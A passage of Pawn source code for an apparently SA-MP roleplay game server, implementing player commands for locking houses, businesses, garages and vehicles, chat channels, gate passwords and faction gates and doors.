				GameTextForPlayer(playerid, "~r~Bonnet Closed", 3500, 3);
			}
			done = 1;
	    }
	    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a vehicle you own.");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You don't own any vehicle.");
	    return 1;
	}

	return 1;
}

IRP:lock(playerid, var[])
{
	new string[128], idx, done, lockdone;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pBiz])
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[Player[playerid][pBiz]][bX], BizInfo[Player[playerid][pBiz]][bY], BizInfo[Player[playerid][pBiz]][bZ]))
	    {
	        if(!BizInfo[Player[playerid][pBiz]][bStatus])
	        {
		        BizInfo[Player[playerid][pBiz]][bStatus] = 1;
				format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: Open", RBT(Player[playerid][pBiz]), BizInfo[Player[playerid][pBiz]][bOwner]);
	            UpdateDynamic3DTextLabelText(BizInfo[Player[playerid][pBiz]][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their business keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Business Unlocked", 3500, 3);
			}
			else if(BizInfo[Player[playerid][pBiz]][bStatus])
	        {
		        BizInfo[Player[playerid][pBiz]][bStatus] = 0;
				format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: Closed", RBT(Player[playerid][pBiz]), BizInfo[Player[playerid][pBiz]][bOwner]);
	            UpdateDynamic3DTextLabelText(BizInfo[Player[playerid][pBiz]][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their business keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Business Locked", 3500, 3);
			}
			done = 1;
			lockdone = 1;
	    }
    }
    if(Player[playerid][pVBiz] && !done)
	{
	    idx = Player[playerid][pVBiz];
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
	    {
	        if(!BizInfo[idx][bStatus])
	        {
		        BizInfo[idx][bStatus] = 1;
				format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: Open", RBT(idx), BizInfo[idx][bOwner]);
	            UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their business keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Business Unlocked", 3500, 3);
			}
			else if(BizInfo[idx][bStatus])
	        {
		        BizInfo[idx][bStatus] = 0;
				format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: Closed", RBT(idx), BizInfo[idx][bOwner]);
	            UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their business keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Business Locked", 3500, 3);
			}
			done = 1;
			lockdone = 1;
	    }
    }
 	if(Player[playerid][pHouse])
	{
	    idx = Player[playerid][pHouse];
	    if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
	    {
	        if(!HouseInfo[Player[playerid][pHouse]][hStatus])
	        {
		        HouseInfo[Player[playerid][pHouse]][hStatus] = 1;
				format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
	            UpdateDynamic3DTextLabelText(HouseInfo[Player[playerid][pHouse]][hText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their house keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~House Unlocked", 3500, 3);
			}
			else if(HouseInfo[Player[playerid][pHouse]][hStatus])
	        {
		        HouseInfo[Player[playerid][pHouse]][hStatus] = 0;
				format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
	            UpdateDynamic3DTextLabelText(HouseInfo[Player[playerid][pHouse]][hText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their house keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~House Locked", 3500, 3);
			}
			done = 1;
			lockdone = 1;
		}
	}
	if(Player[playerid][pVHouse] && !done)
	{
		idx = Player[playerid][pVHouse];
		if(IsPlayerInRangeOfPoint(playerid, 2, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]))
	    {
	        if(!HouseInfo[Player[playerid][pVHouse]][hStatus])
	        {
		        HouseInfo[Player[playerid][pVHouse]][hStatus] = 1;
				format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
	            UpdateDynamic3DTextLabelText(HouseInfo[Player[playerid][pVHouse]][hText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their house keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~House Unlocked", 3500, 3);
			}
			else if(HouseInfo[Player[playerid][pVHouse]][hStatus])
	        {
		        HouseInfo[Player[playerid][pVHouse]][hStatus] = 0;
				format(string, sizeof(string), "House Owner: %s\nHouse Type: %s\nHouse Status: %s", HouseInfo[idx][hOwner], HT(idx), RHS(idx));
	            UpdateDynamic3DTextLabelText(HouseInfo[Player[playerid][pVHouse]][hText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their house keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~House Locked", 3500, 3);
			}
			lockdone = 1;
			return 1;
		}
	}
	if(Player[playerid][pGarage])
	{
	    idx = Player[playerid][pGarage];
	    if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
	    {
	        if(!GarageInfo[Player[playerid][pGarage]][gStatus])
	        {
		        GarageInfo[Player[playerid][pGarage]][gStatus] = 1;
				format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
	            UpdateDynamic3DTextLabelText(GarageInfo[Player[playerid][pGarage]][gText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their garage keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Garage Unlocked", 3500, 3);
			}
			else if(GarageInfo[Player[playerid][pGarage]][gStatus])
	        {
		        GarageInfo[Player[playerid][pGarage]][gStatus] = 0;
		        format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
	            UpdateDynamic3DTextLabelText(GarageInfo[Player[playerid][pGarage]][gText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their garage keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Garage Locked", 3500, 3);
			}
			done = 1;
			lockdone = 1;
		}
	}
	if(Player[playerid][pVGarage] && !done)
	{
		idx = Player[playerid][pVGarage];
		if(IsPlayerInRangeOfPoint(playerid, 2, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
	    {
	        if(!GarageInfo[Player[playerid][pVGarage]][gStatus])
	        {
		        GarageInfo[Player[playerid][pVGarage]][gStatus] = 1;
		        format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
	            UpdateDynamic3DTextLabelText(GarageInfo[Player[playerid][pVGarage]][gText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their garage keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Garage Unlocked", 3500, 3);
			}
			else if(GarageInfo[Player[playerid][pVGarage]][gStatus])
	        {
		        GarageInfo[Player[playerid][pVGarage]][gStatus] = 0;
				format(string, sizeof(string), "Garage of %s\nGarage Size: %s\n%s", GarageInfo[idx][gOwner], GT(idx), GTT(idx));
	            UpdateDynamic3DTextLabelText(GarageInfo[Player[playerid][pVGarage]][gText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s takes out their garage keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Garage Locked", 3500, 3);
			}
			lockdone = 1;
			return 1;
		}
	}
	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 3, vx, vy, vz))
	    {
	        idx = Player[playerid][pVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(doors)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, 0, bonnet, boot, objective);
			    Player[playerid][vLocked] = 0;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Vehicle Unlocked", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, 1, bonnet, boot, objective);
			    Player[playerid][vLocked] = 1;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Vehicle Locked", 3500, 3);
			}
			lockdone = 1;
			return 1;
	    }
	    new Float:vxx, Float:vxy, Float:vxz;
	    GetVehiclePos(Player[playerid][pVVeh], vxx, vxy, vxz);
	    if(IsPlayerInRangeOfPoint(playerid, 3, vxx, vxy, vxz))
	    {
	        idx = Player[playerid][pVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(doors)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, 0, bonnet, boot, objective);
			    Player[playerid][vVLocked] = 0;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Vehicle Unlocked", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, 1, bonnet, boot, objective);
			    Player[playerid][vVLocked] = 1;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Vehicle Locked", 3500, 3);
			}
			lockdone = 1;
	    }
	    GetVehiclePos(Player[playerid][pVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 3, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(doors)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, 0, bonnet, boot, objective);
			    Player[playerid][vVVLocked] = 0;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Vehicle Unlocked", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, 1, bonnet, boot, objective);
			    Player[playerid][vVVLocked] = 1;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Vehicle Locked", 3500, 3);
			}
			lockdone = 1;
	    }
	    new Float:vxxx, Float:vxxy, Float:vxxz;
	    GetVehiclePos(Player[playerid][pVVVVeh], vxxx, vxxy, vxxz);
	    if(IsPlayerInRangeOfPoint(playerid, 3, vxxx, vxxy, vxxz))
	    {
	        idx = Player[playerid][pVVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(doors)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, 0, bonnet, boot, objective);
			    Player[playerid][vVVVLocked] = 0;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and unlocks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Vehicle Unlocked", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, 1, bonnet, boot, objective);
			    Player[playerid][vVVVLocked] = 1;
			    format(string, sizeof(string), "* %s takes out their vehicle keys and locks it.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Vehicle Locked", 3500, 3);
			}
			lockdone = 1;
	    }
	    return 1;
    }
    if(!lockdone)
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You are not near something you can lock/unlock.");
	}
	return 1;
}

IRP:o(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 2 && !OOCStatus) return SendClientMessage(playerid, COLOR_GRAD2, "The global OOC chat is currently disabled.");
 	if(Player[playerid][pAdmin] >= 2)
	 {
		if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/o)oc [text]");
		if(AntiAdv(playerid, var)) return 1;
		if(Player[playerid][pAdmin] >= 2) format(string, sizeof(string), "(( %s %s: %s ))", RPALN(playerid), GetName(playerid), var);
		else format(string, sizeof(string), "(( %s: %s ))", GetName(playerid), var);
		SendClientMessageToAll(COLOR_OOC, string);
		Log("Log/Players/chat.log", string);
	}
	else
    {
		if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/o)oc [text]");
		if(AntiAdv(playerid, var)) return 1;
		else format(string, sizeof(string), "(( %s: %s ))", GetName(playerid), var);
		SendClientMessageToAll(COLOR_OOC, string);
		Log("Log/Players/chat.log", string);
	}
	return 1;
}

IRP:so(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
 	if(Player[playerid][pStaffObserver])
	 {
		if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/so)oc [text]");
		if(AntiAdv(playerid, var)) return 1;
	    format(string, sizeof(string), "(( %s: %s ))", Player[playerid][pSName], var);
		SendClientMessageToAll(COLOR_OOC, string);
		Log("Log/Players/chat.log", string);
	}
	return 1;
}
IRP:newbie(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 2 && !NewbieStatus) return SendClientMessage(playerid, COLOR_GRAD2, "The newbie chat is currently disabled.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /newbie [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(NewbieTime[playerid] > 0)
	{
	    format(string, sizeof(string), "You need to wait %d more seconds before using the newbie chat again.", NewbieTime[playerid]);
		SendClientMessage(playerid, COLOR_GRAD2, string);
		return 1;
	}
	if(Player[playerid][pNMute]) return SendClientMessage(playerid, COLOR_GRAD2, "You are muted from the newbie channel.");
    //if(strlen(Player[playerid][pTag])) format(string, sizeof(string), "** %s %s: %s", Player[playerid][pTag], GetName(playerid), var);
	if(Player[playerid][pAdmin]) format(string, sizeof(string), "** %s %s: %s", RPALN(playerid), GetName(playerid), var);
	else if(Player[playerid][pHelper] && !Player[playerid][pAdmin]) format(string, sizeof(string), "** %s %s: %s", RPHLN(playerid), GetName(playerid), var);
	else if(Player[playerid][pVIP]) format(string, sizeof(string), "** %s VIP %s: %s", RPVIPN(playerid), GetName(playerid), var);
	else if(Player[playerid][pFamed]) format(string, sizeof(string), "** Famed %s: %s", GetName(playerid), var);
	else
	{
    	format(string, sizeof(string), "** %s %s: %s", RLEVEL(playerid), GetName(playerid), var);
    }
	if(!Player[playerid][pHelper] && !Player[playerid][pAdmin]) NewbieTime[playerid] = 40;
	SendClientMessageToAll(COLOR_NEWBIE, string);
	Log("Log/Players/newbie.log", string);
	SetTimerEx("NewbieTimer", 1000, false, "i", playerid);
	return 1;
}
IRP:changegatepassword(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
	new string[128], password[256], gate;
	new idx = Player[playerid][pGate][0];
	new idxx = Player[playerid][pGate][1];
	new idxxx = Player[playerid][pGate][2];
    if(sscanf(var, "ds[256]", gate, password)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /changegatepassword [1-3] [password]");
    switch(gate)
	{
    	case 1:
    	{
           if(!Player[playerid][pGate][0]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a gate in this slot.");
           format(GateInfo[idx][gPassword], 256, "%s", password);
           format(string, sizeof(string), "* You have set your gate password to {FF6347}%s", password);
           SendClientMessage(playerid, COLOR_WHITE, string);
		}
		case 2:
    	{
           if(!Player[playerid][pGate][1]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a gate in this slot.");
           format(GateInfo[idxx][gPassword], 256, "%s", password);
           format(string, sizeof(string), "* You have set your gate password to {FF6347}%s", password);
           SendClientMessage(playerid, COLOR_WHITE, string);
		}
		case 3:
    	{
           if(!Player[playerid][pGate][2]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a gate in this slot.");
           format(GateInfo[idxxx][gPassword], 256, "%s", password);
           format(string, sizeof(string), "* You have set your gate password to {FF6347}%s", password);
           SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}
IRP:gate(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
    // Dynamic Gates
    for(new idx=1; idx<MAX_GATES; idx++)
	{
	    if(GateInfo[idx][gModel] && IsPlayerInRangeOfPoint(playerid, 8, GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ]))
	    {
	        if(strlen(GateInfo[idx][gPassword]))
	        {
	            if(sscanf(var, "s[256]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gate [password]");
	            if(strcmp(var, GateInfo[idx][gPassword])) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid password.");
	            if(!GateInfo[idx][gStatus])
		        {
		            GateInfo[idx][gStatus] = 1;
		            MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ], GateInfo[idx][gSpeed]);
		            SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gORX], GateInfo[idx][gORY], GateInfo[idx][gORZ]);
		        }
		        else
		        {
		            GateInfo[idx][gStatus] = 0;
		            MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gSpeed]);
		            SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
		        }
	        }
	        else
	        {
		        if(!GateInfo[idx][gStatus])
		        {
		            GateInfo[idx][gStatus] = 1;
		            MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gOX], GateInfo[idx][gOY], GateInfo[idx][gOZ], GateInfo[idx][gSpeed]);
		            SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gORX], GateInfo[idx][gORY], GateInfo[idx][gORZ]);
		        }
		        else
		        {
		            GateInfo[idx][gStatus] = 0;
		            MoveDynamicObject(GateInfo[idx][gGate], GateInfo[idx][gCX], GateInfo[idx][gCY], GateInfo[idx][gCZ], GateInfo[idx][gSpeed]);
		            SetDynamicObjectRot(GateInfo[idx][gGate], GateInfo[idx][gCRX], GateInfo[idx][gCRY], GateInfo[idx][gCRZ]);
		        }
	        }
	        idx = MAX_GATES;
	        return 1;
	    }
	}
    // Static Gates
	if(IsACop(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 1544.7363,-1627.0232,13.3672)) // LSPD Barrier
	{
	    if(!LSPDBarrierStatus)
	    {
	        LSPDBarrierStatus = 1;
	        MoveDynamicObject(LSPDBarrier, 1544.6943359375, -1630.73046875, 13.27956199646+0.0001, 0.0002, 0, 0, 90);
	    }
	    else
	    {
	        LSPDBarrierStatus = 0;
	        MoveDynamicObject(LSPDBarrier, 1544.6943359375, -1630.73046875, 13.27956199646-0.0001, 0.0003, 0, 90, 90);
	    }
	    return 1;
	}
	else if(IsACop(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 1588.4501,-1638.5692,13.3672)) // LSPD Gate
	{
	   	if(!LSPDGateStatus)
	    {
	        LSPDGateStatus = 1;
	        MoveDynamicObject(LSPDGate, 1588.6501464844, -1638.0750732422, 6.2343215942383, 3);
	    }
	    else
	    {
	        LSPDGateStatus = 0;
	        MoveDynamicObject(LSPDGate, 1588.6428222656, -1638.02734375, 15.240161895752, 3);
	    }
	    return 1;
	}
	else if(IsAReporter(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 778.0338,-1385.0182,13.7254)) // NA Gate 1
	{
	    if(!SAGateStatus1)
	    {
	        SAGateStatus1 = 1;
	        MoveDynamicObject(SAGate1, 770.497985, -1384.939453, 14.392275, 3);
	    }
	    else
	    {
	        SAGateStatus1 = 0;
	        MoveDynamicObject(SAGate1, 777.457580, -1384.939453, 14.392275, 3);
	    }
	}
	else if(IsAReporter(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 777.5819,-1330.1381,13.5500)) // NA Gate 2
	{
	    if(!SAGateStatus2)
	    {
	        SAGateStatus2 = 1;
	        MoveDynamicObject(SAGate2, 783.026306, -1330.353393, 14.167037, 3);
	    }
	    else
	    {
	        SAGateStatus2 = 0;
	        MoveDynamicObject(SAGate2, 778.548583, -1330.212890, 14.167037, 3);
	    }
	}
	else if(IsMedic(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 1086.4845,-1370.7378,13.7813)) // Saints Gate
	{
	   	if(!SaintsGateStatus)
	    {
	        SaintsGateStatus = 1;
	        MoveDynamicObject(saintsgate1, 1089.195678, -1368.271972, 9.821239, 3, 00.00000, 00.00000, 1.699999);
	    }
	    else
	    {
	        SaintsGateStatus = 0;
	        MoveDynamicObject(saintsgate1, 1089.17590, -1368.28345, 15.52991, 3);
	    }
	    return 1;
	}
	else if(IsMedic(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 1144.9459,-1369.7847,13.7627)) // Saints Gate 2
	{
	   	if(!SaintsGateStatus2)
	    {
	        SaintsGateStatus2 = 1;
	        MoveDynamicObject(saintsgate2, 1150.665893, -1368.090332, 9.715415, 3, 00.00000, 00.00000, 00.00000);
	    }
	    else
	    {
	        SaintsGateStatus2 = 0;
	        MoveDynamicObject(saintsgate2, 1150.60840, -1368.16711, 15.52991, 5);
	    }
	    return 1;
	}
	else if(IsFBI(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 1820.2382,-1316.9248,13.5674)) // FBI Gate 2
	{
	   	if(!FBIGateStatus)
	    {
	        FBIGateStatus = 1;
	        MoveDynamicObject(fbigate, 1820.208251, -1308.792236, 9.667788, 3, 00.00000, 00.00000, 89.199996);
	    }
	    else
	    {
	        FBIGateStatus = 0;
	        MoveDynamicObject(fbigate, 1820.18591, -1308.78442, 15.36408, 3, 00.00000, 00.00000, 89.85793);
	    }
	    return 1;
	}
	else if(Player[playerid][pVIP] > 0 && IsPlayerInRangeOfPoint(playerid, 6, 3071.159179, -1092.963378, 10.391244)) //vip gate
	{
	    if(!vipgateStatus)
	    {
	        vipgateStatus = 1;
	        MoveDynamicObject(vipgate, 3071.203369, -1092.631835, 2.703059, 3);
		}
		else
		{
		    vipgateStatus = 0;
		    MoveDynamicObject(vipgate, 3071.159179, -1092.963378, 10.391244, 3);
		}
	}
	else if(IsDOC(playerid) && IsPlayerInRangeOfPoint(playerid, 9, 870.0662, -2352.8494, 13.1297)) // DOC Gate
	{
	   	if(!docgatestatus)
	    {
	        docgatestatus = 1;
	       // MoveObject(docgate, 865.172241, -2349.313964, 9.071866, 0.000000, 0.000000, 114.299995);
	        //MoveObject(docgate, 864.841857, -2349.405029, 9.071866, 0.000000,0.000000, 116.199966);
	        MoveObject(docgate, 864.841857, -2349.405029, 9.071866, 3);
	    }
	    else
	    {
	        docgatestatus = 0;
	        //MoveObject(docgate, 865.172241, -2349.313964, 15.011875, 0.000000, 0.000000, 114.299995);
	        MoveObject(docgate, 865.172241, -2349.313964, 15.011875, 3);
        }
	    return 1;
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You aren't near a gate you can open.");
	return 1;
}
IRP:door(playerid, var[])
{
	new string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
	if(IsPlayerInRangeOfPoint(playerid, 3, 1536.5867,-1635.6940,-25.5641) && IsACop(playerid))
	{
	    if(!LSPDLobbyStatus) // LSPD LOBBY
	    {
	        MoveDynamicObject(lspddoor, 1535.894042, -1634.874633, -25.334056, 1.50, 00.000000, 00.000000, 87.000000);
	        LSPDLobbyStatus = 1;
	    }
	    else if(LSPDLobbyStatus)
	    {
	    	MoveDynamicObject(lspddoor, 1535.917724,-1634.837768,-25.304058, 1.50, 00.000000, 00.000000, -4.000000);
			LSPDLobbyStatus = 0;
	    }
	}
	else if(IsPlayerInRangeOfPoint(playerid, 3.0,834.2739,-2413.8984,13.0849) && IsDOC(playerid))
    {
        if(!docdoor1status) // Door1
	    {
	        MoveDynamicObject(docdoor1,832.296386,-2413.397216,12.024927,0.50);
	    	format(string, sizeof(string), "* %s puts their finger on the scanner and opens the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        docdoor1status = 1;
	    }
	    else
	    {
            MoveDynamicObject(docdoor1,832.96368, -2414.75024, 12.02620 ,0.50);
            format(string, sizeof(string), "* %s puts their finger on the scanner and closes the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        docdoor1status = 0;
	    }
	    return 1;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 3.0,823.2656,-2418.6077,13.1246) && IsDOC(playerid))
    {
        if(!docdoor2status) // Door2
	    {
	        MoveDynamicObject(docdoor2,821.920532,-2417.921630,12.034635,0.50);
	    	format(string, sizeof(string), "* %s puts their finger on the scanner and opens the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        docdoor2status = 1;
	    }
	    else
	    {
            MoveDynamicObject(docdoor2,822.58929, -2419.34326, 12.02620 ,0.50);
            format(string, sizeof(string), "* %s puts their finger on the scanner and closes the door.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        docdoor2status = 0;
	    }
